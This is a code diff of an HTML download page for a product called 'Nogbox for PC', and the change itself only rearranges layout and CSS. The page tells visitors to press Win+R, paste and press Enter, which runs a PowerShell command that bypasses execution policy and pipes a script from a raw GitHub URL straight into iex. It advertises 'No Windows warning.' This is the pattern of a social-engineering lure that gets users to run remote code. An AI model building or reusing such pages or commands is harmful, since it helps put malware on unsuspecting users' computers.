@@ -11,7 +11,7 @@ main{width:min(520px,100% - 32px);padding:28px 0 40px}
 .top img{width:72px;height:auto}
 h1{font-size:2rem;line-height:1.1;margin:0}
 .top p{margin:.2em 0 0;color:var(--soft);font-size:.95rem}
-.hint{display:grid;gap:10px;margin-top:16px;max-height:0;opacity:0;overflow:hidden;transition:max-height .5s,opacity .4s}.hint.show{max-height:200px;opacity:1}.row{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1.5px solid var(--ice2);border-radius:16px;background:var(--panel)}.row .n{background:var(--ice);color:#0b0d10}.steps{list-style:none;margin:0;padding:0;display:grid;gap:10px}
+.hint{display:grid;gap:10px;margin-top:0;max-height:0;opacity:0;overflow:hidden;transition:max-height .5s,opacity .4s}.hint.show{max-height:200px;opacity:1;margin-top:14px}.row{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1.5px solid var(--ice2);border-radius:16px;background:var(--panel)}.row .n{background:var(--ice);color:#0b0d10}.steps{list-style:none;margin:0;padding:0;display:grid;gap:10px}
 .step{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1.5px solid var(--edge);border-radius:16px;background:var(--panel);opacity:.45;transition:opacity .35s,border-color .35s,transform .35s}
 .step.on{opacity:1;border-color:var(--ice2);transform:translateX(4px)}
 .step.done{opacity:.8;border-color:var(--edge)}
@@ -36,8 +36,8 @@ body.mobile .phone{display:block}
 </style></head><body><main>
 <div class="top"><img src="brain.png" alt="" width="72" height="60"><div><h1>Nogbox for PC</h1><p>One button. No Windows warning.</p></div></div>
 <div class="phone" id="phone"><b>Open this page on your PC.</b>Send yourself the link, then follow the steps there.</div>
-<div class="hint" id="hint" aria-live="polite"><div class="row"><span class="n">2</span><span>Press <kbd>Win</kbd> + <kbd>R</kbd></span></div><div class="row"><span class="n">3</span><span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd></span></div></div>
-<button id="b" class="pulse">GET NOGBOX</button>
+
+<button id="b" class="pulse">GET NOGBOX</button><div class="hint" id="hint" aria-live="polite"><div class="row"><span class="n">2</span><span>Press <kbd>Win</kbd> + <kbd>R</kbd></span></div><div class="row"><span class="n">3</span><span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd></span></div></div>
 <div class="cmd" id="c">powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Chikensoupppp/lk-dac12ca4eb/ios/native-clock-ci/apps/windows-companion/get-nogbox.ps1 | iex"</div>
 <small>Installs for your user only. No admin needed.</small>
 </main><script>
